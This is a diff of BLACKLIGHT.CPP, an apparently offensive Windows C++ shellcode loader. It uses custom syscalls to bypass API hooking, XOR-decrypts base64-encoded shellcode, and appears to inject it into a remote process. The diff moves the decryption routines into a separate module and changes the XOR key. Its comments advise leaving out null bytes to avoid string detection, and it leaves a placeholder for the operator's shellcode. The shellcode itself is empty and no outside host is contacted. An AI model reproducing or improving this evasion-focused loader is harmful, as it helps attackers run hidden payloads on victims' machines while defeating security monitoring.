@@ -1,6 +1,7 @@
 // BLACKLIGHT.CPP
 #include <Windows.h>
 #include "base64.h"
+#include "decryption.h"
 #include "syscalls4.h" // CUSTOM SYSTEM CALLS TO BYPASS API HOOKING
 #include <iostream>
 #include <cstring>
@@ -15,8 +16,6 @@ using std::endl;
 using std::vector;
 
 // PROTOTYPES
-unsigned char* decryptKey(unsigned char*, size_t);
-unsigned char* decryptXOR(unsigned char*, size_t);
 void run(unsigned char*, size_t);
 void debug(string);
 void debug(char*);
@@ -38,13 +37,14 @@ enum DECRYPTION_MODE {
 // TODO: PUT YOUR SC HERE
 const string ENCODED_SC = "";
 
+
 // TODO: IF USING BYTEWISE XOR, PUT KEY HERE IN DECIMAL OR HEX
 const unsigned char BYTEWISE_XOR_KEY = 77;
 
 // TODO: IF USING THE XOR KEY ENCRYPTION, CONFIG KEY AND LENGTH HERE.
 // NOTE: DO NOT INCLUDE NULL BYTE (PREVENT STRING DETECTION) IN EITHER THE ARRAY OR IN THE LENGTH
-const unsigned char XOR_KEY_STR[] = { 'S', 't', 'o', 'r', 'm', 'F', 'a', 'l', 'l' };
-const size_t XOR_KEY_STR_LEN = 9;
+unsigned char XOR_KEY_STR[] = { 'e', 'x', 'i', 'g', 'e', 'n', 't'};
+const size_t XOR_KEY_STR_LEN = 7;
 
 // TODO: SET DECRYPTION MODE TO EITHER ENCRYPTION_KEY OR BYTEWISE_XOR
 DECRYPTION_MODE DECR_MODE = XOR_KEY;
@@ -88,10 +88,10 @@ int main(int argc, char** argv) {
 	debug("decrypting sc");
 	unsigned char* sc = nullptr;
 	if (DECR_MODE == XOR_KEY) {
-		sc = decryptKey(decoded_bytes, sc_len);
+		sc = decryption::decryptKey(XOR_KEY_STR, XOR_KEY_STR_LEN, decoded_bytes, sc_len);
 	}
 	else {
-		sc = decryptXOR(decoded_bytes, sc_len);
+		sc = decryption::decryptXOR(BYTEWISE_XOR_KEY, decoded_bytes, sc_len);
 	}
 	if (!sc) {
 		error("Failed to decrypt sc!");
@@ -222,48 +222,6 @@ void run(unsigned char* sc, size_t sc_len) {
 	debug("Closing the process handle");
 	NtClose(remote_process);
 
-}
-
-/////////////////////////////////////////////////////////////////////////////
-// DECRYPTION ROUTINES
-/////////////////////////////////////////////////////////////////////////////
-
-//  DECRYPTION METHOD WITH XOR KEY
-unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {
-
-	debug("Decrypting with key");
-
-	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
-
-	// i IS THE INDEX IN THE SC
-	// j IS THE INDEX IN THE KEY
-	size_t j = 0;
-	for (size_t i = 0; i < length; i++) {
-
-		// IF WE'RE AT THE END OF THE KEY, GO BACK TO THE BEGINNING
-		if (j == XOR_KEY_STR_LEN) {
-			j = 0;
-		}
-		decrData[i] = encryptedBytes[i] ^ XOR_KEY_STR[j];
-		j++;
-	}
-	decrData[length] = '\x00';
-	return decrData;
-}
-
-// DECRYPT WITH BYTEWISE XOR, NOT RECOMMENDED
-unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {
-
-	debug("decrypting with bytewise xor");
-
-	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
-
-	for (size_t i = 0; i < length; i++) {
-		decrData[i] = encryptedBytes[i] ^ BYTEWISE_XOR_KEY;
-	}
-	decrData[length] = '\x00';
-	if (DEBUG_MODE) cout << "finished decryption" << endl;
-	return decrData;
 }
 
 /////////////////////////////////////////////////////////////////////////////
